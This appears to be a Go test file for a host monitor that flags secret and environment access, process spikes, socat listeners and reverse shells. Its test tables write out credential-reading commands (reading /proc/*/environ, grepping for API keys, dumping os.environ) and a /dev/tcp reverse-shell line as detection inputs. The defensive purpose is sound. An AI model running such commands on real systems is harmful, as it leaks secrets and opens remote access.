package monitor

import (
	"os"
	"strings"
	"testing"
)

func TestCheckEnvAccess(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// Existing patterns - exact env commands
		{"env command", "env", true},
		{"env with args", "env VAR=val command", true},
		{"printenv", "printenv", true},
		{"printenv with arg", "printenv HOME", true},
		{"set command", "set", true},
		{"export command", "export FOO=bar", true},

		// Existing patterns - grep with secret keywords
		{"grep api key", "grep -r API_KEY /workspace", true},
		{"grep password", "grep -i password .env", true},
		{"grep secret", "grep -r secret /workspace", true},
		{"grep token", "grep token config.yml", true},

		// Existing patterns - /proc/*/environ
		{"cat proc environ", "cat /proc/1/environ", true},
		{"cat proc self environ", "cat /proc/self/environ", true},

		// New patterns - expanded secret keywords
		{"grep credential", "grep credential config.yaml", true},
		{"grep auth", "grep auth_token .env", true},
		{"awk with secret keyword", "awk '/password/' .env", true},
		{"sed with token keyword", "sed -n '/token/p' config.yml", true},

		// New patterns - language-specific environ access
		{"python os.environ", "python3 -c 'import os; print(os.environ)'", true},
		{"python os.getenv", "python -c 'import os; os.getenv(\"SECRET\")'", true},
		{"node process.env", "node -e 'console.log(process.env)'", true},
		{"ruby ENV", "ruby -e 'puts ENV[\"SECRET\"]'", true},
		{"awk ENVIRON", "awk 'BEGIN{for(k in ENVIRON) print k, ENVIRON[k]}'", true},

		// New patterns - binary tools on /proc environ
		{"strings proc environ", "strings /proc/1/environ", true},
		{"xxd proc environ", "xxd /proc/1/environ", true},
		{"hexdump proc environ", "hexdump /proc/self/environ", true},
		{"xargs proc environ", "xargs -0 -a /proc/1/environ", true},
		{"xargs proc path", "xargs -0 < /proc/1/environ", true},

		// Negatives - should NOT match
		{"normal grep", "grep -r TODO /workspace", false},
		{"normal python", "python3 script.py", false},
		{"normal node", "node server.js", false},
		{"normal awk", "awk '{print $1}' file.txt", false},
		{"cat normal file", "cat /etc/hosts", false},
		{"sleep command", "sleep 30", false},
		{"ls command", "ls -la", false},
		{"environment in path", "/opt/environment/bin/run", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkEnvAccess(tt.command)
			if got != tt.expected {
				t.Errorf("checkEnvAccess(%q) = %v, want %v", tt.command, got, tt.expected)
			}
		})
	}
}

func TestParseStatusFields(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		wantName string
		wantPPID int
		wantUID  int
	}{
		{
			name:     "typical process",
			input:    "Name:\tbash\nPid:\t42\nPPid:\t1\nUid:\t1000\t1000\t1000\t1000\n",
			wantName: "bash", wantPPID: 1, wantUID: 1000,
		},
		{
			name:     "root process",
			input:    "Name:\tinit\nPPid:\t0\nUid:\t0\t0\t0\t0\n",
			wantName: "init", wantPPID: 0, wantUID: 0,
		},
		{
			name:     "missing fields",
			input:    "Name:\tsleep\n",
			wantName: "sleep", wantPPID: 0, wantUID: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotName, gotPPID, gotUID := parseStatusFields(tt.input)
			if gotName != tt.wantName {
				t.Errorf("name: got %q want %q", gotName, tt.wantName)
			}
			if gotPPID != tt.wantPPID {
				t.Errorf("ppid: got %d want %d", gotPPID, tt.wantPPID)
			}
			if gotUID != tt.wantUID {
				t.Errorf("uid: got %d want %d", gotUID, tt.wantUID)
			}
		})
	}
}

func TestParseCmdline(t *testing.T) {
	tests := []struct {
		name  string
		input []byte
		want  string
	}{
		{
			name:  "simple command",
			input: []byte("bash\x00"),
			want:  "bash",
		},
		{
			name:  "command with args",
			input: []byte("python3\x00-c\x00import os\x00"),
			want:  "python3 -c import os",
		},
		{
			name:  "no trailing null",
			input: []byte("sleep\x0030"),
			want:  "sleep 30",
		},
		{
			name:  "empty",
			input: []byte("\x00"),
			want:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseCmdline(tt.input)
			if got != tt.want {
				t.Errorf("parseCmdline(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestParseStatusFields_TabAndSpaceDelimited(t *testing.T) {
	// /proc/<pid>/status uses a tab between key and value, but be robust.
	input := "Name:   nginx\nPPid:   7\nUid:    33  33  33  33\n"
	name, ppid, uid := parseStatusFields(input)
	if name != "nginx" {
		t.Errorf("name: got %q want %q", name, "nginx")
	}
	if ppid != 7 {
		t.Errorf("ppid: got %d want 7", ppid)
	}
	if uid != 33 {
		t.Errorf("uid: got %d want 33", uid)
	}
}

func TestParseCmdline_KernelThread(t *testing.T) {
	// Kernel threads have empty cmdline; fall back to Name from status.
	// parseCmdline returns "" for empty input; caller uses Name as fallback.
	got := parseCmdline([]byte{})
	if got != "" {
		t.Errorf("expected empty string for kernel thread, got %q", got)
	}
}

func TestDetectProcessSpawnRate(t *testing.T) {
	tests := []struct {
		name      string
		current   int
		previous  int
		threshold int
		wantNil   bool
		wantDelta int
		wantCount int
	}{
		{"delta below threshold", 60, 50, 20, true, 0, 0},
		{"delta at threshold", 70, 50, 20, true, 0, 0},
		{"delta one above threshold", 71, 50, 20, false, 21, 71},
		{"large burst", 200, 10, 20, false, 190, 200},
		{"threshold zero disables", 9999, 0, 0, true, 0, 0},
		{"first poll skipped (previous -1)", 100, -1, 10, true, 0, 0},
		{"processes exited (negative delta)", 40, 60, 20, true, 0, 0},
		{"baseline zero", 25, 0, 20, false, 25, 25},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectProcessSpawnRate(tt.current, tt.previous, tt.threshold)
			if tt.wantNil {
				if got != nil {
					t.Errorf("expected nil, got %+v", got)
				}
				return
			}
			if got == nil {
				t.Fatal("expected non-nil threat, got nil")
			}
			if got.Delta != tt.wantDelta {
				t.Errorf("Delta: got %d want %d", got.Delta, tt.wantDelta)
			}
			if got.Count != tt.wantCount {
				t.Errorf("Count: got %d want %d", got.Count, tt.wantCount)
			}
			if got.Threshold != tt.threshold {
				t.Errorf("Threshold: got %d want %d", got.Threshold, tt.threshold)
			}
		})
	}
}

func TestDetectProcessCountSpike(t *testing.T) {
	makeStats := func(count int) ProcessStats {
		procs := make([]Process, count)
		for i := range procs {
			procs[i] = Process{PID: i + 1, Command: "sh"}
		}
		return ProcessStats{Available: true, TotalCount: count, Processes: procs}
	}

	tests := []struct {
		name      string
		stats     ProcessStats
		threshold int
		wantNil   bool
		wantCount int
	}{
		{"below threshold", makeStats(50), 100, true, 0},
		{"at threshold", makeStats(100), 100, true, 0},
		{"one above threshold", makeStats(101), 100, false, 101},
		{"far above threshold", makeStats(500), 100, false, 500},
		{"threshold zero disables check", makeStats(9999), 0, true, 0},
		{"unavailable stats skipped", ProcessStats{Available: false, TotalCount: 9999}, 100, true, 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectProcessCountSpike(tt.stats, tt.threshold)
			if tt.wantNil {
				if got != nil {
					t.Errorf("expected nil, got %+v", got)
				}
				return
			}
			if got == nil {
				t.Fatal("expected non-nil threat, got nil")
			}
			if got.Count != tt.wantCount {
				t.Errorf("Count: got %d want %d", got.Count, tt.wantCount)
			}
			if got.Threshold != tt.threshold {
				t.Errorf("Threshold: got %d want %d", got.Threshold, tt.threshold)
			}
		})
	}
}

// isLoopbackHost accepts only exact loopback/unspecified addresses: names
// that merely look numeric (127.0.0.256, 127.) are resolved as hostnames and
// can point anywhere.
func TestIsLoopbackHost(t *testing.T) {
	for host, want := range map[string]bool{
		"localhost": true, "localhost.": true, "127.0.0.1": true, "127.1": true,
		"127.0.1": true, "0": true, "0.0": true, "0.0.0.0": true, "0x7f.1": true,
		"0177.0.0.1": true, "::1": true, "[::1]": true,
		"127.0.0.256": false, "127.": false, "127..1": false, "128.0.0.1": false,
		"127.0.0.1.evil.com": false, "localhost.evil.com": false, "08": false,
		"0b1111111.1": false, "1_27.0.0.1": false, "0o177.1": false, "": false,
		"10.0.0.1": false,
	} {
		if got := isLoopbackHost(host); got != want {
			t.Errorf("isLoopbackHost(%q) = %v, want %v", host, got, want)
		}
	}
}

// socatNetAddrRe recognizes socat address forms (including -L/-RECVFROM
// aliases and service-name ports) but not look-alike words or URLs.
func TestSocatNetAddrRe(t *testing.T) {
	for in, want := range map[string]bool{
		"x tcp:example.com:443":    true,
		"x tcp4-connect:h:http":    true,
		"x tcp-l:4444":             true,
		"x tcp-listen:4444,fork":   true,
		"x udp-recvfrom:53":        true,
		"x openssl-listen:4443":    true,
		"x ssl-l:4443":             true,
		"x tcp6:[2001:db8::1]:443": true,
		"tcpsocket: port: 8080":    false,
		`rg "tcp:|exec:" src/`:     false,
		"value: tcp://docker:2375": false,
		"see tcp: notes":           false,
	} {
		if got := socatNetAddrRe.MatchString(in); got != want {
			t.Errorf("socatNetAddrRe(%q) = %v, want %v", in, got, want)
		}
	}
}

// isShellProcess must not rely on argv[0] alone: the process sets argv[0]
// itself, while Name (/proc/<pid>/status, from the executable) comes from the
// kernel. Login shells ("-bash") and leading whitespace are normalized.
func TestIsShellProcess(t *testing.T) {
	for _, tc := range []struct {
		proc Process
		want bool
	}{
		{Process{Command: "bash -c true", Name: "bash"}, true},
		{Process{Command: "/usr/bin/bash -c true"}, true},
		{Process{Command: "-bash"}, true},
		{Process{Command: "   sh -c true"}, true},
		{Process{Command: "something-else -c true", Name: "bash"}, true},
		{Process{Command: "git commit -m x", Name: "git"}, false},
		{Process{Command: "grep -rn x docs", Name: "grep"}, false},
		{Process{Command: "python3 -c x", Name: "python3"}, false},
	} {
		if got := isShellProcess(tc.proc, strings.ToLower(tc.proc.Command)); got != tc.want {
			t.Errorf("isShellProcess(%+v) = %v, want %v", tc.proc, got, tc.want)
		}
	}
}

// A shell whose argv[0] doesn't name a shell is still recognized as one from
// its kernel process name (review of #859).
func TestDetectReverseShells_ShellRecognizedByKernelName(t *testing.T) {
	cmd := `worker exec 3<>/dev/tcp/10.0.0.1/4444`
	if n := len(DetectReverseShells([]Process{{PID: 1, User: "1000", Command: cmd, Name: "bash"}})); n != 1 {
		t.Errorf("shell identified by its kernel name should be checked, got %d threats", n)
	}
	if n := len(DetectReverseShells([]Process{{PID: 1, User: "1000", Command: cmd, Name: "worker"}})); n != 0 {
		t.Errorf("a non-shell process should not be checked for /dev/tcp, got %d threats", n)
	}
}

// The host-side collector records the kernel process name.
func TestReadProcessFromProc_RecordsName(t *testing.T) {
	p, err := readProcessFromProc(os.Getpid())
	if err != nil {
		t.Skipf("no /proc: %v", err)
	}
	if p.Name == "" {
		t.Error("Name should be filled from /proc/<pid>/status")
	}
}
